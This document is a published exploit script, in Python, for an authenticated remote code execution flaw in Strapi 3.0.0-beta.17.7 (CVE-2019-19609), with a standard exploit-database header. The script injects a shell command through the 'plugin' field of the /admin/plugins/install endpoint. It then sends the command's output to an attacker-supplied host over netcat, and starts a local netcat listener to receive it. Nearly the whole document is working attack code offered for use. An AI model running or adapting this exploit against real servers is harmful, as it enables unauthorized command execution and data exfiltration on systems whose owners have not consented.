# Exploit Title: Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)
# Date: 29/08/2021
# Exploit Author: David Utón (M3n0sD0n4ld)
# Vendor Homepage: https://strapi.io/
# Affected Version: strapi-3.0.0-beta.17.7 and earlier
# Tested on: Linux Ubuntu 18.04.5 LTS
# CVE : CVE-2019-19609

#!/usr/bin/python3
# Author: @David_Uton (m3n0sd0n4ld)
# Github: https://m3n0sd0n4ld.github.io
# Usage: python3 CVE-2019-19609.py http[s]//IP[:PORT] TOKEN_JWT COMMAND LHOST

import requests, sys, os, socket

logoType = ('''
=====================================
CVE-2019-19609 - Strapi RCE
-------------------------------------
@David_Uton (M3n0sD0n4ld)
https://m3n0sd0n4ld.github.io/
=====================================
		''')

if __name__ == '__main__':

	# Parameter checking
	if len(sys.argv) != 5:
		print(logoType)
		print("[!] Some of these parameters are missing.")
		print('''
		Use: python3 %s http[s]//IP[:PORT] TOKEN_JWT COMMAND LHOST
		Example: python3 10.10.10.10 eyJHbGCi..... "id" 127.0.0.1''' % sys.argv[0])
	# Exploit run
	else:
		# Paremeters
		url = sys.argv[1]
		token = sys.argv[2]
		command = sys.argv[3]
		lhost = sys.argv[4]
		lport = 9999

		s = requests.session()

		r = s.post(url, verify=False) # SSL == verify=True

		headersData = {
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
			'Authorization': "Bearer %s" % token
		}

		postData = {
			"plugin":"documentation && $(%s > /tmp/.m3 && nc %s %s < /tmp/.m3 | rm /tmp/.m3)" % (command, lhost, lport)
		}

		print(logoType)
		os.system("nc -nvlp 9999 &")
		try:
			print("[+] Successful operation!!!")
			r = s.post(url + "/admin/plugins/install", headers=headersData, data=postData, verify=False) # SSL == verify=True
			# Content print
			print(r.text)
		except:
			print("[!] An error occurred, try again.")
			sys.exit(1)